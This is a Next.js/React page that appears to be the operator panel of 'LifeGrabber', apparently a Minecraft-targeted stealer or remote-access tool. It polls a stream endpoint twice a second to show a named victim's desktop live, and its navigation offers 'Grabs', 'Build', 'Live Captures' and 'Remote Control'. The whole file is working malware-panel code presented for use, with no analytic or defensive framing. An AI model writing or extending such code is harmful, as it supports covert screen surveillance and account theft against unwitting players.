'use client';

import { useState, useEffect } from 'react';
import { useRouter, useParams } from 'next/navigation';

const colors = {
  bg: '#050508',
  panel: 'rgba(13, 13, 18, 0.7)',
  border: 'rgba(255,255,255,0.06)',
  text: '#f0f0f0',
  textDim: '#6b6e7b',
  green: '#22c55e',
};

function NavItem({ icon, label, active, onClick }) {
  return (
    <div onClick={onClick} className="btn-smooth" style={{
      display: 'flex', alignItems: 'center', gap: 10, padding: '10px 14px', borderRadius: 8,
      background: active ? 'rgba(34, 197, 94, 0.08)' : 'transparent',
      color: active ? colors.green : colors.textDim, fontSize: 14, cursor: 'pointer', marginBottom: 2,
    }}
    onMouseEnter={e => { if (!active) { e.currentTarget.style.background = 'rgba(255,255,255,0.03)'; e.currentTarget.style.color = colors.text; } }}
    onMouseLeave={e => { if (!active) { e.currentTarget.style.background = 'transparent'; e.currentTarget.style.color = colors.textDim; } }}
    >
      <span style={{ fontSize: 16, width: 20, textAlign: 'center' }}>{icon}</span>
      <span>{label}</span>
    </div>
  );
}

export default function UserStreamPage() {
  const router = useRouter();
  const params = useParams();
  const username = params.username;
  const [streamFrame, setStreamFrame] = useState(null);
  const [online, setOnline] = useState(false);

  useEffect(() => {
    if (!username) return;
    const iv = setInterval(() => {
      fetch('/api/stream?username=' + encodeURIComponent(username))
        .then(r => r.json())
        .then(d => {
          if (d.frame) { setStreamFrame(d.frame); setOnline(true); }
          else { setStreamFrame(null); setOnline(false); }
        })
        .catch(() => { setOnline(false); });
    }, 500);
    return () => clearInterval(iv);
  }, [username]);

  return (
    <div className="page-enter" style={{ display: 'flex', minHeight: '100vh', background: colors.bg, color: colors.text, fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif' }}>
      <aside style={{ width: 220, borderRight: '1px solid rgba(255,255,255,0.06)', padding: '20px 12px', display: 'flex', flexDirection: 'column', background: 'rgba(10, 10, 16, 0.8)', backdropFilter: 'blur(12px)' }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: 10, padding: '0 10px', marginBottom: 28 }}>
          <div style={{ width: 28, height: 28, borderRadius: 6, background: 'rgba(34, 197, 94, 0.15)' }} />
          <span style={{ fontSize: 14, fontWeight: 600 }}>LifeGrabber</span>
        </div>
        <div style={{ flex: 1 }}>
          <NavItem icon="📊" label="Dashboard" onClick={() => router.push('/dashboard')} />
          <NavItem icon="⚡" label="Grabs" onClick={() => router.push('/dashboard/grabs')} />
          <NavItem icon="🔨" label="Build" onClick={() => router.push('/dashboard/build')} />
          <NavItem icon="📡" label="Live Captures" onClick={() => router.push('/dashboard')} />
          <NavItem icon="🖥" label="Remote Control" onClick={() => router.push('/dashboard/remote-control')} />
          <NavItem icon="⚙️" label="Settings" onClick={() => router.push('/dashboard/settings')} />
        </div>
        <div>
          <NavItem icon="🚪" label="Log out" onClick={() => window.location.href = '/api/auth/logout'} />
        </div>
      </aside>

      <main style={{ flex: 1, padding: '28px 36px' }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: 12, marginBottom: 20 }}>
          <div onClick={() => router.push('/dashboard/remote-control')} style={{ cursor: 'pointer', color: colors.textDim, fontSize: 14 }}
            onMouseEnter={e => e.currentTarget.style.color = colors.text}
            onMouseLeave={e => e.currentTarget.style.color = colors.textDim}>
            ← Back
          </div>
          <div style={{ width: 1, height: 20, background: colors.border }} />
          <img src={'https://mc-heads.net/avatar/' + username + '/32'} alt="" style={{ width: 28, height: 28, borderRadius: 6 }} />
          <h1 style={{ fontSize: 20, fontWeight: 700, margin: 0 }}>{username}</h1>
          <span style={{ color: online ? colors.green : colors.textDim, fontSize: 12 }}>{online ? 'Live' : 'Offline'}</span>
        </div>

        <div className="glass-card" style={{ borderRadius: 12, overflow: 'hidden', border: '1px solid ' + (online ? colors.green : colors.border) }}>
          {streamFrame ? (
            <img src={streamFrame} alt={username + "'s desktop"} style={{ width: '100%', display: 'block' }} />
          ) : (
            <div style={{ height: 400, display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', color: colors.textDim }}>
              <span style={{ fontSize: 28, marginBottom: 8 }}>📡</span>
              <span style={{ fontSize: 14 }}>{online ? 'Connecting to stream...' : 'Waiting for ' + username + ' to come online...'}</span>
            </div>
          )}
        </div>
      </main>
    </div>
  );
}